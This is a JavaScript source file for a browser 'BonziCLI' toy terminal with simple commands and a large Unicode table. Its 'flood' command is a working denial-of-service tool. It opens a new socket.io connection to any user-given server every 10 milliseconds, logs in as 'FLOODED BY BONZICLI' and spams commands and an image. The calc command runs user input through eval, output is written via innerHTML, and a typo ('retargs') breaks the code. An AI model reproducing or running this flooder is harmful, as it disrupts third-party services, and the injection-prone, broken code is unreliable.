const terminal = document.getElementById("terminal");
const input = document.getElementById("commandInput");
const clearBtn = document.getElementById("clearBtn");

function generateRandomString(length) {
    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789 ';
    let result = '';
    for (let i = 0; i < length; i++) {
        // Pick a random index from the template string
        const randomIndex = Math.floor(Math.random() * chars.length);
        result += chars.charAt(randomIndex);
    }
    return result;
}
function generateRandomStringUnicodely(length) {
    const chars = `ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789Ѐ	Ё	Ђ	Ѓ	Є	Ѕ	І	Ї	Ј	Љ	Њ	Ћ	Ќ	Ѝ	Ў	Џ
А	Б	В	Г	Д	Е	Ж	З	И	Й	К	Л	М	Н	О	П
Р	С	Т	У	Ф	Х	Ц	Ч	Ш	Щ	Ъ	Ы	Ь	Э	Ю	Я
а	б	в	г	д	е	ж	з	и	й	к	л	м	н	о	п
р	с	т	у	ф	х	ц	ч	ш	щ	ъ	ы	ь	э	ю	я
ѐ	ё	ђ	ѓ	є	ѕ	і	ї	ј	љ	њ	ћ	ќ	ѝ	ў	џ
Ѡ	ѡ	Ѣ	ѣ	Ѥ	ѥ	Ѧ	ѧ	Ѩ	ѩ	Ѫ	ѫ	Ѭ	ѭ	Ѯ	ѯ
Ѱ	ѱ	Ѳ	ѳ	Ѵ	ѵ	Ѷ	ѷ	Ѹ	ѹ	Ѻ	ѻ	Ѽ	ѽ	Ѿ	ѿ
Ҁ	ҁ	҂	҃	҄	҅	҆	҇	҈	҉	Ҋ	ҋ	Ҍ	ҍ	Ҏ	ҏ
Ґ	ґ	Ғ	ғ	Ҕ	ҕ	Җ	җ	Ҙ	ҙ	Қ	қ	Ҝ	ҝ	Ҟ	ҟ
Ҡ	ҡ	Ң	ң	Ҥ	ҥ	Ҧ	ҧ	Ҩ	ҩ	Ҫ	ҫ	Ҭ	ҭ	Ү	ү
Ұ	ұ	Ҳ	ҳ	Ҵ	ҵ	Ҷ	ҷ	Ҹ	ҹ	Һ	һ	Ҽ	ҽ	Ҿ	ҿ
Ӏ	Ӂ	ӂ	Ӄ	ӄ	Ӆ	ӆ	Ӈ	ӈ	Ӊ	ӊ	Ӌ	ӌ	Ӎ	ӎ	ӏ
Ӑ	ӑ	Ӓ	ӓ	Ӕ	ӕ	Ӗ	ӗ	Ә	ә	Ӛ	ӛ	Ӝ	ӝ	Ӟ	ӟ
Ӡ	ӡ	Ӣ	ӣ	Ӥ	ӥ	Ӧ	ӧ	Ө	ө	Ӫ	ӫ	Ӭ	ӭ	Ӯ	ӯ
Ӱ	ӱ	Ӳ	ӳ	Ӵ	ӵ	Ӷ	ӷ	Ӹ	ӹ	Ӻ	ӻ	Ӽ	ӽ	Ӿ	ӿ
Ԁ	ԁ	Ԃ	ԃ	Ԅ	ԅ	Ԇ	ԇ	Ԉ	ԉ	Ԋ	ԋ	Ԍ	ԍ	Ԏ	ԏ
Ԑ	ԑ	Ԓ	ԓ	Ԕ	ԕ	Ԗ	ԗ	Ԙ	ԙ	Ԛ	ԛ	Ԝ	ԝ	Ԟ	ԟ
Ԡ	ԡ	Ԣ	ԣ	Ԥ	ԥ	Ԧ	ԧ	Ԩ	ԩ	Ԫ	ԫ	Ԭ	ԭ	Ԯ	ԯ
԰	Ա	Բ	Գ	Դ	Ե	Զ	Է	Ը	Թ	Ժ	Ի	Լ	Խ	Ծ	Կ
Հ	Ձ	Ղ	Ճ	Մ	Յ	Ն	Շ	Ո	Չ	Պ	Ջ	Ռ	Ս	Վ	Տ
Ր	Ց	Ւ	Փ	Ք	Օ	Ֆ	՗	՘	ՙ	՚	՛	՜	՝	՞	՟
ՠ	ա	բ	գ	դ	ե	զ	է	ը	թ	ժ	ի	լ	խ	ծ	կ
հ	ձ	ղ	ճ	մ	յ	ն	շ	ո	չ	պ	ջ	ռ	ս	վ	տ
ր	ց	ւ	փ	ք	օ	ֆ	և	ֈ	։	֊	֋	֌	֍	֎	֏
֐	֑	֒	֓	֔	֕	֖	֗	֘	֙	֚	֛	֜	֝	֞	֟
֠	֡	֢	֣	֤	֥	֦	֧	֨	֩	֪	֫	֬	֭	֮	֯
ְ	ֱ	ֲ	ֳ	ִ	ֵ	ֶ	ַ	ָ	ֹ	ֺ	ֻ	ּ	ֽ	־	ֿ
׀	ׁ	ׂ	׃	ׄ	ׅ	׆	ׇ	׈	׉	׊	׋	׌	׍	׎	׏
א	ב	ג	ד	ה	ו	ז	ח	ט	י	ך	כ	ל	ם	מ	ן
נ	ס	ע	ף	פ	ץ	צ	ק	ר	ש	ת	׫	׬	׭	׮	ׯ
װ	ױ	ײ	׳	״	׵	׶	׷	׸	׹	׺	׻	׼	׽	׾	؁	؂	؃	؄	؅	؆	؇	؈	؉	؊	؋	،	؍	؎	؏
ؐ	ؑ	ؒ	ؓ	ؔ	ؕ	ؖ	ؗ	ؘ	ؙ	ؚ	؛	؜	؝	؞	؟
ؠ	ء	آ	أ	ؤ	إ	ئ	ا	ب	ة	ت	ث	ج	ح	خ	د
ذ	ر	ز	س	ش	ص	ض	ط	ظ	ع	غ	ػ	ؼ	ؽ	ؾ	ؿ
ـ	ف	ق	ك	ل	م	ن	ه	و	ى	ي	ً	ٌ	ٍ	َ	ُ
ِ	ّ	ْ	ٓ	ٔ	ٕ	ٖ	ٗ	٘	ٙ	ٚ	ٛ	ٜ	ٝ	ٞ	ٟ
٠	١	٢	٣	٤	٥	٦	٧	٨	٩	٪	٫	٬	٭	ٮ	ٯ
ٰ	ٱ	ٲ	ٳ	ٴ	ٵ	ٶ	ٷ	ٸ	ٹ	ٺ	ٻ	ټ	ٽ	پ	ٿ
ڀ	ځ	ڂ	ڃ	ڄ	څ	چ	ڇ	ڈ	ډ	ڊ	ڋ	ڌ	ڍ	ڎ	ڏ
ڐ	ڑ	ڒ	ړ	ڔ	ڕ	ږ	ڗ	ژ	ڙ	ښ	ڛ	ڜ	ڝ	ڞ	ڟ
ڠ	ڡ	ڢ	ڣ	ڤ	ڥ	ڦ	ڧ	ڨ	ک	ڪ	ګ	ڬ	ڭ	ڮ	گ
ڰ	ڱ	ڲ	ڳ	ڴ	ڵ	ڶ	ڷ	ڸ	ڹ	ں	ڻ	ڼ	ڽ	ھ	ڿ
ۀ	ہ	ۂ	ۃ	ۄ	ۅ	ۆ	ۇ	ۈ	ۉ	ۊ	ۋ	ی	ۍ	ێ	ۏ
ې	ۑ	ے	ۓ	۔	ە	ۖ	ۗ	ۘ	ۙ	ۚ	ۛ	ۜ	۝	۞	۟
۠	ۡ	ۢ	ۣ	ۤ	ۥ	ۦ	ۧ	ۨ	۩	۪	۫	۬	ۭ	ۮ	ۯ
۰	۱	۲	۳	۴	۵	۶	۷	۸	۹	ۺ	ۻ	ۼ	۽	܀	܁	܂	܃	܄	܅	܆	܇	܈	܉	܊	܋	܌	܍	܎	܏
ܐ	ܑ	ܒ	ܓ	ܔ	ܕ	ܖ	ܗ	ܘ	ܙ	ܚ	ܛ	ܜ	ܝ	ܞ	ܟ
ܠ	ܡ	ܢ	ܣ	ܤ	ܥ	ܦ	ܧ	ܨ	ܩ	ܪ	ܫ	ܬ	ܭ	ܮ	ܯ
ܰ	ܱ	ܲ	ܳ	ܴ	ܵ	ܶ	ܷ	ܸ	ܹ	ܺ	ܻ	ܼ	ܽ	ܾ	ܿ
݀	݁	݂	݃	݄	݅	݆	݇	݈	݉	݊	݋	݌	ݍ	ݎ	ݏ
ݐ	ݑ	ݒ	ݓ	ݔ	ݕ	ݖ	ݗ	ݘ	ݙ	ݚ	ݛ	ݜ	ݝ	ݞ	ݟ
ݠ	ݡ	ݢ	ݣ	ݤ	ݥ	ݦ	ݧ	ݨ	ݩ	ݪ	ݫ	ݬ	ݭ	ݮ	ݯ
ݰ	ݱ	ݲ	ݳ	ݴ	ݵ	ݶ	ݷ	ݸ	ݹ	ݺ	ݻ	ݼ	ݽ	ݾ	ݿ
ހ	ށ	ނ	ރ	ބ	ޅ	ކ	އ	ވ	މ	ފ	ދ	ތ	ލ	ގ	ޏ
ސ	ޑ	ޒ	ޓ	ޔ	ޕ	ޖ	ޗ	ޘ	ޙ	ޚ	ޛ	ޜ	ޝ	ޞ	ޟ
ޠ	ޡ	ޢ	ޣ	ޤ	ޥ	ަ	ާ	ި	ީ	ު	ޫ	ެ	ޭ	ޮ	ޯ
ް	ޱ	޲	޳	޴	޵	޶	޷	޸	޹	޺	޻	޼	޽	޾	޿
߀	߁	߂	߃	߄	߅	߆	߇	߈	߉	ߊ	ߋ	ߌ	ߍ	ߎ	ߏ
ߐ	ߑ	ߒ	ߓ	ߔ	ߕ	ߖ	ߗ	ߘ	ߙ	ߚ	ߛ	ߜ	ߝ	ߞ	ߟ
ߠ	ߡ	ߢ	ߣ	ߤ	ߥ	ߦ	ߧ	ߨ	ߩ	ߪ	߫	߬	߭	߮	߯
߰	߱	߲	߳	ߴ	ߵ	߶	߷	߸	߹	ߺ	߻	߼	߽	߾	ം	ഃ	ഄ	അ	ആ	ഇ	ഈ	ഉ	ഊ	ഋ	ഌ	഍	എ	ഏ
ഐ	഑	ഒ	ഓ	ഔ	ക	ഖ	ഗ	ഘ	ങ	ച	ഛ	ജ	ഝ	ഞ	ട
ഠ	ഡ	ഢ	ണ	ത	ഥ	ദ	ധ	ന	ഩ	പ	ഫ	ബ	ഭ	മ	യ
ര	റ	ല	ള	ഴ	വ	ശ	ഷ	സ	ഹ	ഺ	഻	഼	ഽ	ാ	ി
ീ	ു	ൂ	ൃ	ൄ	൅	െ	േ	ൈ	൉	ൊ	ോ	ൌ	്	ൎ	൏
൐	൑	൒	൓	ൔ	ൕ	ൖ	ൗ	൘	൙	൚	൛	൜	൝	൞	ൟ
ൠ	ൡ	ൢ	ൣ	൤	൥	൦	൧	൨	൩	൪	൫	൬	൭	൮	൯
൰	൱	൲	൳	൴	൵	൶	൷	൸	൹	ൺ	ൻ	ർ	ൽ	ൾ	ൿ
඀	ඁ	ං	ඃ	඄	අ	ආ	ඇ	ඈ	ඉ	ඊ	උ	ඌ	ඍ	ඎ	ඏ
ඐ	එ	ඒ	ඓ	ඔ	ඕ	ඖ	඗	඘	඙	ක	ඛ	ග	ඝ	ඞ	ඟ
ච	ඡ	ජ	ඣ	ඤ	ඥ	ඦ	ට	ඨ	ඩ	ඪ	ණ	ඬ	ත	ථ	ද
ධ	න	඲	ඳ	ප	ඵ	බ	භ	ම	ඹ	ය	ර	඼	ල	඾	඿
ව	ශ	ෂ	ස	හ	ළ	ෆ	෇	෈	෉	්	෋	෌	෍	෎	ා
ැ	ෑ	ි	ී	ු	෕	ූ	෗	ෘ	ෙ	ේ	ෛ	ො	ෝ	ෞ	ෟ
෠	෡	෢	෣	෤	෥	෦	෧	෨	෩	෪	෫	෬	෭	෮	෯
෰	෱	ෲ	ෳ	෴	෵	෶	෷	෸	෹	෺	෻	෼	෽	෾	෿ᐁ	ᐂ	ᐃ	ᐄ	ᐅ	ᐆ	ᐇ	ᐈ	ᐉ	ᐊ	ᐋ	ᐌ	ᐍ	ᐎ	ᐏ
ᐐ	ᐑ	ᐒ	ᐓ	ᐔ	ᐕ	ᐖ	ᐗ	ᐘ	ᐙ	ᐚ	ᐛ	ᐜ	ᐝ	ᐞ	ᐟ
ᐠ	ᐡ	ᐢ	ᐣ	ᐤ	ᐥ	ᐦ	ᐧ	ᐨ	ᐩ	ᐪ	ᐫ	ᐬ	ᐭ	ᐮ	ᐯ
ᐰ	ᐱ	ᐲ	ᐳ	ᐴ	ᐵ	ᐶ	ᐷ	ᐸ	ᐹ	ᐺ	ᐻ	ᐼ	ᐽ	ᐾ	ᐿ
ᑀ	ᑁ	ᑂ	ᑃ	ᑄ	ᑅ	ᑆ	ᑇ	ᑈ	ᑉ	ᑊ	ᑋ	ᑌ	ᑍ	ᑎ	ᑏ
ᑐ	ᑑ	ᑒ	ᑓ	ᑔ	ᑕ	ᑖ	ᑗ	ᑘ	ᑙ	ᑚ	ᑛ	ᑜ	ᑝ	ᑞ	ᑟ
ᑠ	ᑡ	ᑢ	ᑣ	ᑤ	ᑥ	ᑦ	ᑧ	ᑨ	ᑩ	ᑪ	ᑫ	ᑬ	ᑭ	ᑮ	ᑯ
ᑰ	ᑱ	ᑲ	ᑳ	ᑴ	ᑵ	ᑶ	ᑷ	ᑸ	ᑹ	ᑺ	ᑻ	ᑼ	ᑽ	ᑾ	ᑿ
ᒀ	ᒁ	ᒂ	ᒃ	ᒄ	ᒅ	ᒆ	ᒇ	ᒈ	ᒉ	ᒊ	ᒋ	ᒌ	ᒍ	ᒎ	ᒏ
ᒐ	ᒑ	ᒒ	ᒓ	ᒔ	ᒕ	ᒖ	ᒗ	ᒘ	ᒙ	ᒚ	ᒛ	ᒜ	ᒝ	ᒞ	ᒟ
ᒠ	ᒡ	ᒢ	ᒣ	ᒤ	ᒥ	ᒦ	ᒧ	ᒨ	ᒩ	ᒪ	ᒫ	ᒬ	ᒭ	ᒮ	ᒯ
ᒰ	ᒱ	ᒲ	ᒳ	ᒴ	ᒵ	ᒶ	ᒷ	ᒸ	ᒹ	ᒺ	ᒻ	ᒼ	ᒽ	ᒾ	ᒿ
ᓀ	ᓁ	ᓂ	ᓃ	ᓄ	ᓅ	ᓆ	ᓇ	ᓈ	ᓉ	ᓊ	ᓋ	ᓌ	ᓍ	ᓎ	ᓏ
ᓐ	ᓑ	ᓒ	ᓓ	ᓔ	ᓕ	ᓖ	ᓗ	ᓘ	ᓙ	ᓚ	ᓛ	ᓜ	ᓝ	ᓞ	ᓟ
ᓠ	ᓡ	ᓢ	ᓣ	ᓤ	ᓥ	ᓦ	ᓧ	ᓨ	ᓩ	ᓪ	ᓫ	ᓬ	ᓭ	ᓮ	ᓯ
ᓰ	ᓱ	ᓲ	ᓳ	ᓴ	ᓵ	ᓶ	ᓷ	ᓸ	ᓹ	ᓺ	ᓻ	ᓼ	ᓽ	ᓾ	ᓿ	ᔁ	ᔂ	ᔃ	ᔄ	ᔅ	ᔆ	ᔇ	ᔈ	ᔉ	ᔊ	ᔋ	ᔌ	ᔍ	ᔎ	ᔏ
ᔐ	ᔑ	ᔒ	ᔓ	ᔔ	ᔕ	ᔖ	ᔗ	ᔘ	ᔙ	ᔚ	ᔛ	ᔜ	ᔝ	ᔞ	ᔟ
ᔠ	ᔡ	ᔢ	ᔣ	ᔤ	ᔥ	ᔦ	ᔧ	ᔨ	ᔩ	ᔪ	ᔫ	ᔬ	ᔭ	ᔮ	ᔯ
ᔰ	ᔱ	ᔲ	ᔳ	ᔴ	ᔵ	ᔶ	ᔷ	ᔸ	ᔹ	ᔺ	ᔻ	ᔼ	ᔽ	ᔾ	ᔿ
ᕀ	ᕁ	ᕂ	ᕃ	ᕄ	ᕅ	ᕆ	ᕇ	ᕈ	ᕉ	ᕊ	ᕋ	ᕌ	ᕍ	ᕎ	ᕏ
ᕐ	ᕑ	ᕒ	ᕓ	ᕔ	ᕕ	ᕖ	ᕗ	ᕘ	ᕙ	ᕚ	ᕛ	ᕜ	ᕝ	ᕞ	ᕟ
ᕠ	ᕡ	ᕢ	ᕣ	ᕤ	ᕥ	ᕦ	ᕧ	ᕨ	ᕩ	ᕪ	ᕫ	ᕬ	ᕭ	ᕮ	ᕯ
ᕰ	ᕱ	ᕲ	ᕳ	ᕴ	ᕵ	ᕶ	ᕷ	ᕸ	ᕹ	ᕺ	ᕻ	ᕼ	ᕽ	ᕾ	ᕿ
ᖀ	ᖁ	ᖂ	ᖃ	ᖄ	ᖅ	ᖆ	ᖇ	ᖈ	ᖉ	ᖊ	ᖋ	ᖌ	ᖍ	ᖎ	ᖏ
ᖐ	ᖑ	ᖒ	ᖓ	ᖔ	ᖕ	ᖖ	ᖗ	ᖘ	ᖙ	ᖚ	ᖛ	ᖜ	ᖝ	ᖞ	ᖟ
ᖠ	ᖡ	ᖢ	ᖣ	ᖤ	ᖥ	ᖦ	ᖧ	ᖨ	ᖩ	ᖪ	ᖫ	ᖬ	ᖭ	ᖮ	ᖯ
ᖰ	ᖱ	ᖲ	ᖳ	ᖴ	ᖵ	ᖶ	ᖷ	ᖸ	ᖹ	ᖺ	ᖻ	ᖼ	ᖽ	ᖾ	ᖿ
ᗀ	ᗁ	ᗂ	ᗃ	ᗄ	ᗅ	ᗆ	ᗇ	ᗈ	ᗉ	ᗊ	ᗋ	ᗌ	ᗍ	ᗎ	ᗏ
ᗐ	ᗑ	ᗒ	ᗓ	ᗔ	ᗕ	ᗖ	ᗗ	ᗘ	ᗙ	ᗚ	ᗛ	ᗜ	ᗝ	ᗞ	ᗟ
ᗠ	ᗡ	ᗢ	ᗣ	ᗤ	ᗥ	ᗦ	ᗧ	ᗨ	ᗩ	ᗪ	ᗫ	ᗬ	ᗭ	ᗮ	ᗯ
ᗰ	ᗱ	ᗲ	ᗳ	ᗴ	ᗵ	ᗶ	ᗷ	ᗸ	ᗹ	ᗺ	ᗻ	ᗼ	ᗽ	ᗾ	ᗿᘀ	ᘁ	ᘂ	ᘃ	ᘄ	ᘅ	ᘆ	ᘇ	ᘈ	ᘉ	ᘊ	ᘋ	ᘌ	ᘍ	ᘎ	ᘏ
ᘐ	ᘑ	ᘒ	ᘓ	ᘔ	ᘕ	ᘖ	ᘗ	ᘘ	ᘙ	ᘚ	ᘛ	ᘜ	ᘝ	ᘞ	ᘟ
ᘠ	ᘡ	ᘢ	ᘣ	ᘤ	ᘥ	ᘦ	ᘧ	ᘨ	ᘩ	ᘪ	ᘫ	ᘬ	ᘭ	ᘮ	ᘯ
ᘰ	ᘱ	ᘲ	ᘳ	ᘴ	ᘵ	ᘶ	ᘷ	ᘸ	ᘹ	ᘺ	ᘻ	ᘼ	ᘽ	ᘾ	ᘿ
ᙀ	ᙁ	ᙂ	ᙃ	ᙄ	ᙅ	ᙆ	ᙇ	ᙈ	ᙉ	ᙊ	ᙋ	ᙌ	ᙍ	ᙎ	ᙏ
ᙐ	ᙑ	ᙒ	ᙓ	ᙔ	ᙕ	ᙖ	ᙗ	ᙘ	ᙙ	ᙚ	ᙛ	ᙜ	ᙝ	ᙞ	ᙟ
ᙠ	ᙡ	ᙢ	ᙣ	ᙤ	ᙥ	ᙦ	ᙧ	ᙨ	ᙩ	ᙪ	ᙫ	ᙬ	᙭	᙮	ᙯ
ᙰ	ᙱ	ᙲ	ᙳ	ᙴ	ᙵ	ᙶ	ᙷ	ᙸ	ᙹ	ᙺ	ᙻ	ᙼ	ᙽ	ᙾ	ᙿ
 	ᚁ	ᚂ	ᚃ	ᚄ	ᚅ	ᚆ	ᚇ	ᚈ	ᚉ	ᚊ	ᚋ	ᚌ	ᚍ	ᚎ	ᚏ
ᚐ	ᚑ	ᚒ	ᚓ	ᚔ	ᚕ	ᚖ	ᚗ	ᚘ	ᚙ	ᚚ	᚛	᚜	᚝	᚞	᚟
ᚠ	ᚡ	ᚢ	ᚣ	ᚤ	ᚥ	ᚦ	ᚧ	ᚨ	ᚩ	ᚪ	ᚫ	ᚬ	ᚭ	ᚮ	ᚯ
ᚰ	ᚱ	ᚲ	ᚳ	ᚴ	ᚵ	ᚶ	ᚷ	ᚸ	ᚹ	ᚺ	ᚻ	ᚼ	ᚽ	ᚾ	ᚿ
ᛀ	ᛁ	ᛂ	ᛃ	ᛄ	ᛅ	ᛆ	ᛇ	ᛈ	ᛉ	ᛊ	ᛋ	ᛌ	ᛍ	ᛎ	ᛏ
ᛐ	ᛑ	ᛒ	ᛓ	ᛔ	ᛕ	ᛖ	ᛗ	ᛘ	ᛙ	ᛚ	ᛛ	ᛜ	ᛝ	ᛞ	ᛟ
ᛠ	ᛡ	ᛢ	ᛣ	ᛤ	ᛥ	ᛦ	ᛧ	ᛨ	ᛩ	ᛪ	᛫	᛬	᛭	ᛮ	ᛯ
ᛰ	ᛱ	ᛲ	ᛳ	ᛴ	ᛵ	ᛶ	ᛷ	ᛸ	᛹	᛺	᛻	᛼	᛽	᛾	᛿	‑	‒	–	—	―	‖	‗	‘	’	‚	‛	“	”	„	‟
†	‡	•	‣	․	‥	…	‧	 	 	‪	‫	‬	‭	‮	 
‰	‱	′	″	‴	‵	‶	‷	‸	‹	›	※	‼	‽	‾	‿
⁀	⁁	⁂	⁃	⁄	⁅	⁆	⁇	⁈	⁉	⁊	⁋	⁌	⁍	⁎	⁏
⁐	⁑	⁒	⁓	⁔	⁕	⁖	⁗	⁘	⁙	⁚	⁛	⁜	⁝	⁞	 
⁠	⁡	⁢	⁣	⁤	⁥	⁦	⁧	⁨	⁩	⁪	⁫	⁬	⁭	⁮	⁯
⁰	ⁱ	⁲	⁳	⁴	⁵	⁶	⁷	⁸	⁹	⁺	⁻	⁼	⁽	⁾	ⁿ
₀	₁	₂	₃	₄	₅	₆	₇	₈	₉	₊	₋	₌	₍	₎	₏
ₐ	ₑ	ₒ	ₓ	ₔ	ₕ	ₖ	ₗ	ₘ	ₙ	ₚ	ₛ	ₜ	₝	₞	₟
₠	₡	₢	₣	₤	₥	₦	₧	₨	₩	₪	₫	€	₭	₮	₯
₰	₱	₲	₳	₴	₵	₶	₷	₸	₹	₺	₻	₼	₽	₾	₿
⃀	⃁	⃂	⃃	⃄	⃅	⃆	⃇	⃈	⃉	⃊	⃋	⃌	⃍	⃎	⃏
⃐	⃑	⃒	⃓	⃔	⃕	⃖	⃗	⃘	⃙	⃚	⃛	⃜	⃝	⃞	⃟
⃠	⃡	⃢	⃣	⃤	⃥	⃦	⃧	⃨	⃩	⃪	⃫	⃬	⃭	⃮	⃯
⃰	⃱	⃲	⃳	⃴	⃵	⃶	⃷	⃸	⃹	⃺	⃻	⃼	⃽	⃾	⃿	⌁	⌂	⌃	⌄	⌅	⌆	⌇	⌈	⌉	⌊	⌋	⌌	⌍	⌎	⌏
⌐	⌑	⌒	⌓	⌔	⌕	⌖	⌗	⌘	⌙	⌚	⌛	⌜	⌝	⌞	⌟
⌠	⌡	⌢	⌣	⌤	⌥	⌦	⌧	⌨	〈	〉	⌫	⌬	⌭	⌮	⌯
⌰	⌱	⌲	⌳	⌴	⌵	⌶	⌷	⌸	⌹	⌺	⌻	⌼	⌽	⌾	⌿
⍀	⍁	⍂	⍃	⍄	⍅	⍆	⍇	⍈	⍉	⍊	⍋	⍌	⍍	⍎	⍏
⍐	⍑	⍒	⍓	⍔	⍕	⍖	⍗	⍘	⍙	⍚	⍛	⍜	⍝	⍞	⍟
⍠	⍡	⍢	⍣	⍤	⍥	⍦	⍧	⍨	⍩	⍪	⍫	⍬	⍭	⍮	⍯
⍰	⍱	⍲	⍳	⍴	⍵	⍶	⍷	⍸	⍹	⍺	⍻	⍼	⍽	⍾	⍿
⎀	⎁	⎂	⎃	⎄	⎅	⎆	⎇	⎈	⎉	⎊	⎋	⎌	⎍	⎎	⎏
⎐	⎑	⎒	⎓	⎔	⎕	⎖	⎗	⎘	⎙	⎚	⎛	⎜	⎝	⎞	⎟
⎠	⎡	⎢	⎣	⎤	⎥	⎦	⎧	⎨	⎩	⎪	⎫	⎬	⎭	⎮	⎯
⎰	⎱	⎲	⎳	⎴	⎵	⎶	⎷	⎸	⎹	⎺	⎻	⎼	⎽	⎾	⎿
⏀	⏁	⏂	⏃	⏄	⏅	⏆	⏇	⏈	⏉	⏊	⏋	⏌	⏍	⏎	⏏
⏐	⏑	⏒	⏓	⏔	⏕	⏖	⏗	⏘	⏙	⏚	⏛	⏜	⏝	⏞	⏟
⏠	⏡	⏢	⏣	⏤	⏥	⏦	⏧	⏨	⏩	⏪	⏫	⏬	⏭	⏮	⏯
⏰	⏱	⏲	⏳	⏴	⏵	⏶	⏷	⏸	⏹	⏺	⏻	⏼	⏽	⏾	⏿␀	␁	␂	␃	␄	␅	␆	␇	␈	␉	␊	␋	␌	␍	␎	␏
␐	␑	␒	␓	␔	␕	␖	␗	␘	␙	␚	␛	␜	␝	␞	␟
␠	␡	␢	␣	␤	␥	␦	␧	␨	␩	␪	␫	␬	␭	␮	␯
␰	␱	␲	␳	␴	␵	␶	␷	␸	␹	␺	␻	␼	␽	␾	␿
⑀	⑁	⑂	⑃	⑄	⑅	⑆	⑇	⑈	⑉	⑊	⑋	⑌	⑍	⑎	⑏
⑐	⑑	⑒	⑓	⑔	⑕	⑖	⑗	⑘	⑙	⑚	⑛	⑜	⑝	⑞	⑟
①	②	③	④	⑤	⑥	⑦	⑧	⑨	⑩	⑪	⑫	⑬	⑭	⑮	⑯
⑰	⑱	⑲	⑳	⑴	⑵	⑶	⑷	⑸	⑹	⑺	⑻	⑼	⑽	⑾	⑿
⒀	⒁	⒂	⒃	⒄	⒅	⒆	⒇	⒈	⒉	⒊	⒋	⒌	⒍	⒎	⒏
⒐	⒑	⒒	⒓	⒔	⒕	⒖	⒗	⒘	⒙	⒚	⒛	⒜	⒝	⒞	⒟
⒠	⒡	⒢	⒣	⒤	⒥	⒦	⒧	⒨	⒩	⒪	⒫	⒬	⒭	⒮	⒯
⒰	⒱	⒲	⒳	⒴	⒵	Ⓐ	Ⓑ	Ⓒ	Ⓓ	Ⓔ	Ⓕ	Ⓖ	Ⓗ	Ⓘ	Ⓙ
Ⓚ	Ⓛ	Ⓜ	Ⓝ	Ⓞ	Ⓟ	Ⓠ	Ⓡ	Ⓢ	Ⓣ	Ⓤ	Ⓥ	Ⓦ	Ⓧ	Ⓨ	Ⓩ
ⓐ	ⓑ	ⓒ	ⓓ	ⓔ	ⓕ	ⓖ	ⓗ	ⓘ	ⓙ	ⓚ	ⓛ	ⓜ	ⓝ	ⓞ	ⓟ
ⓠ	ⓡ	ⓢ	ⓣ	ⓤ	ⓥ	ⓦ	ⓧ	ⓨ	ⓩ	⓪	⓫	⓬	⓭	⓮	⓯
⓰	⓱	⓲	⓳	⓴	⓵	⓶	⓷	⓸	⓹	⓺	⓻	⓼	⓽	⓾	⓿
`;
    let result = '';
    for (let i = 0; i < length; i++) {
        // Pick a random index from the template string
        const randomIndex = Math.floor(Math.random() * chars.length);
        result += chars.charAt(randomIndex);
    }
    return result;
}
const commands = {
  help: () => {
    return [
      "Available commands:",
      "help - Show commands",
      "clear - Clear terminal",
      "echo [text] - Repeat text",
      "time - Show current time",
      "date - Show current date",
      "about - About this CLI",
      "color [css color] - Change text color",
      "bg [css color] - Change background color",
      "calc [math] - Calculate expression",
      "flood [server url] - Flood a skiddable server"
    ].join("\n");
  },

  about: () => {
    return "BonziCLI v1.0";
  },

  time: () => {
    return new Date().toLocaleTimeString();
  },

  date: () => {
    return new Date().toDateString();
  }
};

function addLine(text, className = "outputLine"){
  const div = document.createElement("div");

  div.className = `line ${className}`;

  div.innerHTML = text.replace(/\n/g, "<br>");

  terminal.appendChild(div);

  terminal.scrollTop = terminal.scrollHeight;
}

function runCommand(value){

  addLine(`> ${value}`, "inputLine");

  const parts = value.trim().split(" ");

  const cmd = parts[0].toLowerCase();

  const args = parts.slice(1);

  if(!cmd) return;

  if(cmd === "clear"){
    terminal.innerHTML = "";
    return;
  }

  if(cmd === "echo"){
    addLine(args.join(" "));
    return;
  }

  if(cmd === "flood"){
    addLine("Trying to flood server...");
    if(args.join(" ").includes("bonzi.gay")||args.join(" ").includes("mickai.me")){
        addLine("This server is not allowed to be flooded. Try again with a skiddable server.", "errorLine")
    }
    else {
        addLine("Flood successful.");
        setInterval(function(){
    const socket = io(args.join(" "));
    socket.emit("login", {name: "FLOODED BY BONZICLI", room: ""});
    socket.emit("command", {list: ["color"]});
    socket.emit("command", {list: ["img", "https://files.catbox.moe/u037iz.jpg"]});
        }, 10);
    }
    return;
  }

  if(cmd === "calc"){
    if (args.join(" ") === "1/0"){
      setInterval(function(){
        addLine(generateRandomStringUnicodely(Math.floor(Math.random()*1000)));
      });
    } else {
    try{
      const result = eval(args.join(" "));
      addLine(String(result));
    }catch{
      addLine("Invalid math expression.", "errorLine");
    }
    return;
    }
  }

  if(commands[cmd]){
    addLine(commands[cmd](args));
    retargs
  }

  addLine(`Unknown command: ${cmd}`, "errorLine");
}

input.addEventListener("keydown", e => {

  if(e.key === "Enter"){

    const value = input.value;

    input.value = "";

    runCommand(value);
  }

});

clearBtn.onclick = () => {
  terminal.innerHTML = "";
};

addLine("BonziCLI ready.");
addLine("Type 'help' to see commands.");